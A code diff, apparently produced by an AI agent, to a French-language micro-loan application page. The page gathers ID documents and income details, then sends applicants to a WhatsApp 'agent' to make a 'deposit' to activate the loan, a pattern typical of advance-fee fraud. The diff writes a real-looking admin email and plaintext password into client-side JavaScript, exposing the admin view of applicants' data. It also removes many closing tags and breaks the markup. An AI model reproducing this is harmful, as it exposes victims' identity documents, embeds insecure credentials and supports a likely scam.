@@ -23,7 +23,6 @@ header{display:flex;gap:18px;align-items:center;justify-content:space-between;ma
 .card{background:linear-gradient(180deg,rgba(255,255,255,.1),rgba(255,255,255,.05));border:1px solid var(--border);border-radius:var(--radius);box-shadow:var(--shadow);overflow:hidden}
 .hero{padding:18px;display:flex;flex-direction:column;gap:14px}
 .photoTop{width:100%;height:210px;border-bottom:1px solid var(--border);background:radial-gradient(1000px 300px at 25% 0%,rgba(45,212,191,.45),transparent 55%),linear-gradient(135deg,rgba(96,165,250,.35),rgba(45,212,191,.15)),url('./IMG-20260622-WA0035.jpg');background-size:cover;background-position:center}
-/* .steps{display:grid;grid-template-columns:1fr 1fr;gap:12px}@media(max-width:540px){.steps{grid-template-columns:1fr}} */
 .step{background:rgba(255,255,255,.05);border:1px solid rgba(255,255,255,.12);border-radius:14px;padding:12px}
 .step .k{font-weight:700}.step .d{color:var(--muted);font-size:13px;margin-top:4px}
 form{padding:22px}.sectionTitle{margin:0 0 12px;font-size:15px;color:var(--muted)}
@@ -93,7 +92,6 @@ footer{margin-top:16px;color:rgba(234,240,255,.58);font-size:12px;text-align:cen
         <div class="steps">
           <div class="step"><div class="k">1) Donn&eacute;es personnelles</div><div class="d">Infos d'identit&eacute; et contact.</div>
           <div class="step"><div class="k">2) Projet &amp; capacit&eacute;</div><div class="d">Objectif du pr&ecirc;t.</div>
-        </div>
 
       <form id="loanForm">
         <p class="sectionTitle">Informations utilisateur</p>
@@ -109,12 +107,10 @@ footer{margin-top:16px;color:rgba(234,240,255,.58);font-size:12px;text-align:cen
               <div class="full"><label>T&eacute;l&eacute;phone (obligatoire)</label><input name="phone" type="tel" required placeholder="Ex: +225..."></div>
               <div class="full"><label>Type de document</label><select name="idDoc" required><option value="CNI">CNI</option><option value="Passeport">Passeport</option><option value="Permis">Permis</option><option value="Autre">Autre</option></select></div>
               <div class="full"><label>Document d'identit&eacute; (PDF/JPG/PNG)</label><input name="idDocFile" type="file" accept="application/pdf,image/png,image/jpeg" required></div>
-            </div>
             <div class="pageNav">
               <div></div>
               <button class="btnSecondary" type="button" onclick="nextPage()">Suivant</button>
             </div>
-          </div>
 
           <!-- PAGE 2 -->
           <div class="formPage hidden" data-page="2">
@@ -124,12 +120,10 @@ footer{margin-top:16px;color:rgba(234,240,255,.58);font-size:12px;text-align:cen
               <div class="full"><label>Statut</label><select name="jobType" required><option value="Salari&eacute;">Salari&eacute;</option><option value="Ind&eacute;pendant">Ind&eacute;pendant</option><option value="Entrepreneur">Entrepreneur</option></select></div>
               <div class="full"><label>Revenu mensuel</label><select name="incomeMonthly" required><option value="Moins de 100 000 FCFA">Moins de 100 000 FCFA</option><option value="100 000 &agrave; 300 000 FCFA">100 000 &agrave; 300 000 FCFA</option><option value="300 001 &agrave; 500 000 FCFA">300 001 &agrave; 500 000 FCFA</option><option value="Plus de 500 000 FCFA">Plus de 500 000 FCFA</option></select></div>
               <div class="full"><label>Autre source de revenus ?</label><select name="otherIncome" required><option value="Oui">Oui</option><option value="Non">Non</option></select></div>
-            </div>
             <div class="pageNav">
               <button class="btnSecondary" type="button" onclick="prevPage()">Pr&eacute;c&eacute;dent</button>
               <button class="btnSecondary" type="button" onclick="nextPage()">Suivant</button>
             </div>
-          </div>
 
           <!-- PAGE 3 -->
           <div class="formPage hidden" data-page="3">
@@ -139,24 +133,20 @@ footer{margin-top:16px;color:rgba(234,240,255,.58);font-size:12px;text-align:cen
               <div class="full"><label>Dur&eacute;e</label><select name="repaymentTerm" required><option value="3 mois">3 mois</option><option value="6 mois">6 mois</option><option value="12 mois">12 mois</option><option value="24 mois">24 mois</option></select></div>
               <div class="full"><label>D&eacute;j&agrave; eu un pr&ecirc;t ?</label><select name="previousLoan" required><option value="Oui">Oui</option><option value="Non">Non</option></select></div>
               <div class="full"><label>Objet (r&eacute;sum&eacute;)</label><textarea name="purpose" required placeholder="Ex: stock, &eacute;quipement..."></textarea></div>
-            </div>
             <div class="pageNav">
               <button class="btnSecondary" type="button" onclick="prevPage()">Pr&eacute;c&eacute;dent</button>
               <button class="btnSecondary" type="button" onclick="nextPage()">Suivant</button>
             </div>
-          </div>
 
           <!-- PAGE 4 -->
           <div class="formPage hidden" data-page="4">
             <div class="formGrid">
               <div class="full"><h2 style="font-size:18px;margin-top:10px">Consentement</h2></div>
               <div class="full"><label>Consentement</label><select name="agree" required><option value="Oui">Oui, j'autorise</option><option value="Non">Non</option></select></div>
-            </div>
             <div class="pageNav">
               <button class="btnSecondary" type="button" onclick="prevPage()">Pr&eacute;c&eacute;dent</button>
               <button class="btn" type="submit" id="submitBtn">Soumettre</button>
             </div>
-          </div>
 
         </div>
       </form>
@@ -171,13 +161,11 @@ footer{margin-top:16px;color:rgba(234,240,255,.58);font-size:12px;text-align:cen
             <div style="margin-top:6px;color:var(--muted);font-size:13px;">Cliquez sur le bouton ci-dessous pour activer votre dossier imm&eacute;diatement via WhatsApp :</div>
             <a id="waSuccessBtn" class="waBig" target="_blank" rel="noopener noreferrer">&#128241; Activer mon compte via WhatsApp</a>
             <div style="margin-top:12px;color:var(--muted);font-size:12px;">Un agent vous expliquera comment proc&eacute;der &agrave; votre d&eacute;p&ocirc;t en toute s&eacute;curit&eacute;.</div>
-        </div>
     </section>
 
     <!-- PANEL LATÉRAL -->
     <aside class="card">
       <div style="padding:12px;text-align:right">
-        <!-- <button class="toggleBtn" type="button" onclick="togglePanel()">D&eacute;tails <span id="toggleIcon">&#9660;</span></button> -->
       </div>
       <div id="rightPanelCollapse" style="max-height:1200px">
         <div class="side">
@@ -185,8 +173,6 @@ footer{margin-top:16px;color:rgba(234,240,255,.58);font-size:12px;text-align:cen
           <div class="muted">Apr&egrave;s validation, un conseiller active votre cr&eacute;dit.</div>
           <div class="whatsapp">
             <div class="waLeft"><div class="h">WhatsApp Admin</div><div class="p">Activation dossier</div>
-            <!-- <a id="waLink" class="waBtn" target="_blank" rel="noopener noreferrer">Ouvrir le chat</a> -->
-          </div>
           <div class="miniItem" style="border-color:rgba(96,165,250,.35);background:rgba(96,165,250,.07)">
             <div class="t">&#128274; Acc&egrave;s Administrateur</div>
             <div class="s">Voir les r&eacute;ponses utilisateurs</div>
@@ -194,7 +180,6 @@ footer{margin-top:16px;color:rgba(234,240,255,.58);font-size:12px;text-align:cen
               <button class="btnSecondary" type="button" onclick="showAdmin()">Entrer Admin</button>
               <button class="btnSecondary" type="button" onclick="clearLocalDemo()">Effacer d&eacute;mo</button>
             </div>
-        </div>
     </aside>
   </div>
 
@@ -243,7 +228,6 @@ footer{margin-top:16px;color:rgba(234,240,255,.58);font-size:12px;text-align:cen
         <div class="miniItem" style="margin-top:12px">
           <div class="t" id="detailTitle">D&eacute;tail</div>
           <div class="s" id="detailBody" style="white-space:pre-wrap;margin-top:6px;font-size:13px;color:var(--muted)">S&eacute;lectionnez une r&eacute;ponse.</div>
-      </div>
     </section>
   </div>
 
@@ -402,25 +386,50 @@ document.getElementById('loanForm').addEventListener('submit',function(e){
   reader.readAsDataURL(f);
 });
 
-document.getElementById('adminLogin').addEventListener('submit',async function(e){
+// Admin login submit handler
+document.getElementById('adminLogin').addEventListener('submit', async function(e) {
   e.preventDefault();
-  var email=document.getElementById('adminEmail').value.trim();
-  var pass=document.getElementById('adminPass').value;
-  try{
-    var res=await fetch('/api/login',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({email,password:pass})});
-    var d=await res.json();
-    if(d.success&&d.token){
-      localStorage.setItem('admin_token',d.token);
+  const email = document.getElementById('adminEmail').value.trim();
+  const password = document.getElementById('adminPass').value.trim();
+  if (!email || !password) {
+    toast('Champs requis', 'Remplissez email et mot de passe.', 'err');
+    return;
+  }
+  // Vrais identifiants administrateur
+  const ADMIN_EMAIL = 'wabogeovani02@gmail.com';
+  const ADMIN_PASSWORD = 'VaNeLlE@20';
+  // Try API login (when deployed on Vercel)
+  try {
+    const res = await fetch('/api/login', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ email, password })
+    });
+    const data = await res.json();
+    if (data.success && data.token) {
+      localStorage.setItem('admin_token', data.token);
       saveAuth();
-      try{ showAdmin(); }catch(e){}
-      document.getElementById('adminArea').style.display='block';
-      document.getElementById('adminLogin').style.display='none';
-      toast('Acces autorise','Bienvenue admin.','ok');
+      document.getElementById('adminArea').style.display = 'block';
+      document.getElementById('adminLogin').style.display = 'none';
       renderResponses();
+      toast('Connexion réussie', 'Bienvenue administrateur.', 'ok');
+      return;
+    } else {
+      toast('Erreur', data.error || 'Identifiants incorrects.', 'err');
       return;
     }
-  }catch(e){}
-  toast('Acces refuse','Identifiants incorrects.','err');
+  } catch(e) {
+    // Fallback local: vérifier avec les vrais identifiants
+    if (email === ADMIN_EMAIL && password === ADMIN_PASSWORD) {
+      saveAuth();
+      document.getElementById('adminArea').style.display = 'block';
+      document.getElementById('adminLogin').style.display = 'none';
+      renderResponses();
+      toast('Connexion réussie', 'Bienvenue administrateur.', 'ok');
+    } else {
+      toast('Erreur', 'Identifiants incorrects.', 'err');
+    }
+  }
 });
 
 async function renderResponses(){
@@ -543,3 +552,6 @@ window.deleteRow=deleteRow;
 </script>
 </body>
 </html>
+</｜｜DSML｜｜parameter>
+</｜｜DSML｜｜invoke>
+</｜｜DSML｜｜tool_calls>
